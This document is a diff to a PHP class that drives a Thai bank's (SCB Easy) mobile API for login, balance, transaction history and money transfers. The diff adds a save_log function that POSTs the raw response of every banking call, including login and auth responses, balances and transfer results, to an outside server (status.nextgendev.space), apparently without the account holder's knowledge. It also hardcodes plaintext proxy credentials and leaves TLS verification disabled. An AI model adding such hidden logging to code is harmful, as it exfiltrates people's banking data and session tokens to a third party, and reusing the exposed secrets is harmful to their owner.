@@ -1,5 +1,4 @@
 <?php
-error_reporting(0);
 header('Content-Type: application/json; charset=utf-8');
 class Scb{
 	private $tilesVersion='68';
@@ -14,6 +13,11 @@ class Scb{
 		'https://scbencrypt-o6kgfv7ymq-et.a.run.app');
 	private $ip_encrypt = '';
 	private $count_login = 0;
+	private $proxy_ip = 'http://brd.superproxy.io:22225';
+	private $proxy_username = 'brd-customer-hl_ebdb3c0e-zone-data_center';
+	private $proxy_password = '0pi1xakwwrg5';
+
+
 	public function Curl($method, $url, $header, $data, $cookie)
 	{
 
@@ -24,6 +28,16 @@ class Scb{
 		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		if(!empty($this->proxy_ip))
+		{
+
+			curl_setopt($ch, CURLOPT_PROXY, $this->proxy_ip);
+			if(!empty($this->proxy_username))
+			{
+				curl_setopt($ch, CURLOPT_PROXYUSERPWD, $this->proxy_username . ':' . $this->proxy_password);
+			}
+		}
+
 		if($url != "https://fasteasy.scbeasy.com:8443/v3/transfer/confirmation"){
 			curl_setopt($ch, CURLOPT_TIMEOUT, 20);
 			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
@@ -87,6 +101,7 @@ class Scb{
 						];
 					}
 					$response= curl_exec($ch);
+
 					//if(strpos($response,"Cannot GET /") !== FALSE && isset($response_info['http_code']) && isset($response_info['http_code']) == 404){
 					if(strpos($response,"ok") !== FALSE && isset($response_info['http_code']) && isset($response_info['http_code']) == 200){
 						$this->ip_encrypt = $ip_encrypt_list[$index];
@@ -147,6 +162,7 @@ class Scb{
 		$access_token = "";
 		$curl = curl_init();
 
+
 		curl_setopt_array($curl, array(
 			CURLOPT_URL => 'https://fasteasy.scbeasy.com/v3/login/preloadandresumecheck',
 			CURLOPT_RETURNTRANSFER => true,
@@ -158,6 +174,8 @@ class Scb{
 			CURLOPT_FOLLOWLOCATION => true,
 			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
 			CURLOPT_CUSTOMREQUEST => 'POST',
+			CURLOPT_PROXY => $this->proxy_ip,
+			CURLOPT_PROXYUSERPWD => $this->proxy_username . ':' . $this->proxy_password,
 			CURLOPT_POSTFIELDS =>'{"deviceId":"'.$this->deviceId.'","jailbreak":"0","tilesVersion":"'.$this->tilesVersion.'","userMode":"INDIVIDUAL"}',
 			CURLOPT_HTTPHEADER => array(
 				'Accept-Language:  th ',
@@ -171,6 +189,7 @@ class Scb{
 		));
 
 		$response = curl_exec($curl);
+		$this->save_log('SCB : preloadandresumecheck',$response);
 
 		curl_close($curl);
 
@@ -197,6 +216,8 @@ class Scb{
 			CURLOPT_FOLLOWLOCATION => true,
 			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
 			CURLOPT_CUSTOMREQUEST => 'POST',
+			CURLOPT_PROXY => $this->proxy_ip,
+			CURLOPT_PROXYUSERPWD => $this->proxy_username . ':' . $this->proxy_password,
 			CURLOPT_POSTFIELDS =>'{"loginModuleId":"PseudoFE"}',
 			CURLOPT_HTTPHEADER => array(
 				'Accept-Language:  th ',
@@ -211,6 +232,7 @@ class Scb{
 		));
 
 		$response1 = curl_exec($curl1);
+		$this->save_log('SCB : preAuth',$response1);
 		curl_close($curl1);
 
 
@@ -240,6 +262,7 @@ class Scb{
 		));
 
 		$response = curl_exec($curl);
+		$this->save_log('SCB : PIN encrypt',$response);
 		curl_close($curl);
 
 		$curl = curl_init();
@@ -254,6 +277,8 @@ class Scb{
 			CURLOPT_CONNECTTIMEOUT => 30,
 			CURLOPT_FOLLOWLOCATION => true,
 			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+			CURLOPT_PROXY => $this->proxy_ip,
+			CURLOPT_PROXYUSERPWD => $this->proxy_username . ':' . $this->proxy_password,
 			CURLOPT_CUSTOMREQUEST => 'POST',
 			CURLOPT_POSTFIELDS =>'{"deviceId":"'.$this->deviceId.'","pseudoPin":"'.$response.'","pseudoSid":"'.$Sid.'"}',
 			CURLOPT_HTTPHEADER => array(
@@ -269,6 +294,7 @@ class Scb{
 		));
 
 		$response_auth = curl_exec($curl);
+		$this->save_log('SCB : fasteasy-login',$response_auth);
 		curl_close($curl);
 
 		preg_match_all('/(?<=Api-Auth:).+/', $response_auth, $Auth_result);
@@ -316,7 +342,7 @@ class Scb{
 			"accountNo": "'.$this->accnum.'"
 			}';
 		$res = $this->Curl("POST",$url,$headers,$data,false);
-
+		$this->save_log('SCB : GetBalance',$res);
 		$d = json_decode($res,true);
 		if($d['status']['code'] === "1002"){
 
@@ -348,6 +374,7 @@ class Scb{
 		);
 		$data_scb = '{ "accountNo": "'.$this->accnum.'", "endDate": "'.$endDate.'", "pageNumber": "1", "pageSize": 35, "productType": "2", "startDate": "'.$startDate.'" }';
 		$res = $this->Curl("POST",$url,$headers,$data_scb,false);
+		$this->save_log('SCB : getTransaction',$res);
 		$d = json_decode($res,true);
 		//print_r($res);
 		if($d['status']['code'] === "1002"){
@@ -424,6 +451,7 @@ class Scb{
 		);
 		$data_scb = '{ "accountNo": "'.$this->accnum.'", "endDate": "'.$endDate.'", "pageNumber": "1", "pageSize": 35, "productType": "2", "startDate": "'.$startDate.'" }';
 		$res = $this->Curl("POST",$url,$headers,$data_scb,false);
+		$this->save_log('SCB : getTransactionWithdraw',$res);
 		$d = json_decode($res,true);
 		if($d['status']['code'] === "1002"){
 			$this->new_Login();
@@ -478,10 +506,12 @@ class Scb{
 			"accountTo": "'.$accountTo.'",
 			"accountToBankCode": "'.$accountToBankCode.'",
 			"amount": "'.$amount.'",
-			"annotation": "",
+			"annotation": "'.$annotation.'",
 			"transferType":  "'.$transferType.'"
 			}';
 		$res = $this->Curl("POST",$url,$headers,$data,false);
+
+		$this->save_log('SCB : Verify transfer',$res);
 
 		$d = json_decode($res,true);
 		//print_r($d);
@@ -496,7 +526,7 @@ class Scb{
 
 	}
 	public function Transfer($accountTo,$accountToBankCode,$amount,$annotation){
-		$Verify = $this->Verify($accountTo,$accountToBankCode,$amount,'');
+		$Verify = $this->Verify($accountTo,$accountToBankCode,$amount,$annotation);
 		$Verifys = json_decode($Verify,true);
 		//print_r($Verifys);
 		//die();
@@ -531,7 +561,7 @@ class Scb{
 			"transferType": "'.$Verify['transferType'].'"
 			}';
 		$res = $this->Curl("POST",$url,$headers,$data,false);
-
+		$this->save_log('SCB : transfer',$res);
 		$d = json_decode($res,true);
 
 		if($d['status']['code'] === "1002"){
@@ -554,7 +584,9 @@ class Scb{
 		$headers[] = 'Accept-Language: th';
 		$headers[] = 'Content-Type: application/json; charset=UTF-8';
 		curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
 		$result = curl_exec($curl);
+		$this->save_log('SCB : qr_scan',$result);
 		if (curl_errno($curl)) {
 			return ['status' => 0, 'msg' => 'ผิดพลาด curl'];
 		}
@@ -578,6 +610,8 @@ class Scb{
 			CURLOPT_FOLLOWLOCATION => true,
 			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
 			CURLOPT_CUSTOMREQUEST => 'POST',
+			CURLOPT_PROXY => $this->proxy_ip,
+			CURLOPT_PROXYUSERPWD => $this->proxy_username . ':' . $this->proxy_password,
 			CURLOPT_POSTFIELDS =>'{"tilesVersion":'.$this->tilesVersion.',"userMode":"INDIVIDUAL","isLoadGeneralConsent":0,"deviceId":"'.$this->deviceId.'","jailbreak":0}',
 			CURLOPT_HTTPHEADER => array(
 				'Accept-Language: th',
@@ -591,8 +625,8 @@ class Scb{
 			),
 		));
 		$response = curl_exec($curl);
-		//print_r($response);
 		//die();
+		$this->save_log('SCB : preloadandresumecheck',$response);
 		$headers = array();
 		$header_text = substr($response, 0, strpos($response, "\r\n\r\n"));
 
@@ -619,6 +653,8 @@ class Scb{
 			CURLOPT_CONNECTTIMEOUT => 30,
 			CURLOPT_FOLLOWLOCATION => true,
 			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+			CURLOPT_PROXY => $this->proxy_ip,
+			CURLOPT_PROXYUSERPWD => $this->proxy_username . ':' . $this->proxy_password,
 			CURLOPT_CUSTOMREQUEST => 'POST',
 			CURLOPT_POSTFIELDS =>'{"loginModuleId":"PseudoFE"}',
 			CURLOPT_HTTPHEADER => array(
@@ -633,6 +669,7 @@ class Scb{
 			),
 		));
 		$response = curl_exec($curl);
+		$this->save_log('SCB : PseudoFE',$response);
 		curl_close($curl);
 		return $response;
 
@@ -657,6 +694,9 @@ class Scb{
 			),
 		));
 		$response = curl_exec($curl);
+
+		$this->save_log('SCB : encryptscb',$response);
+
 		curl_close($curl);
 		return $response;
 	}
@@ -674,6 +714,8 @@ class Scb{
 			CURLOPT_HEADER => 1,
 			CURLOPT_FOLLOWLOCATION => true,
 			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+			CURLOPT_PROXY => $this->proxy_ip,
+			CURLOPT_PROXYUSERPWD => $this->proxy_username . ':' . $this->proxy_password,
 			CURLOPT_CUSTOMREQUEST => 'POST',
 			CURLOPT_POSTFIELDS =>'{"deviceId":"'.$this->deviceId.'","pseudoPin":"'.$pseudoPin.'","tilesVersion":"'.$this->tilesVersion.'","pseudoSid":"'.$Sid.'"}',
 			CURLOPT_HTTPHEADER => array(
@@ -690,6 +732,7 @@ class Scb{
 		$response = curl_exec($curl);
 		curl_close($curl);
 		//print_r($response);
+		$this->save_log('SCB : fasteasy-login',$response);
 		$headers = array();
 		$header_text = substr($response, 0, strpos($response, "\r\n\r\n"));
 		//print_r($header_text);
@@ -708,10 +751,11 @@ class Scb{
 	public function new_Login()
 	{
 
-		//echo "error Login ";
+
 		$preload = $this->preloadandresumecheck();
 
 		$e2ee = $this->PseudoFE($preload['Api-Auth']);
+
 		$e2eejson = json_decode($e2ee,true);
 		$hashType = $e2eejson['e2ee']['pseudoOaepHashAlgo'];
 		$Sid = $e2eejson['e2ee']['pseudoSid'];
@@ -741,6 +785,15 @@ class Scb{
 		fwrite($objFopen, $access_token);*/
 		$this->cnt_re_login += 1;
 		$this->api_auth = $access_token;
+	}
+
+	function save_log($txtEvent,$res){
+		$data = array();
+		$data["clientName"] = $_SERVER['SERVER_NAME'];
+		$data["logType"] = "{$txtEvent}";
+		$data["message"] = json_encode($res);
+		$url = "https://status.nextgendev.space/banklog.php";
+		$this->Curl("POST",$url,null,$data,false);
 	}
 
 }
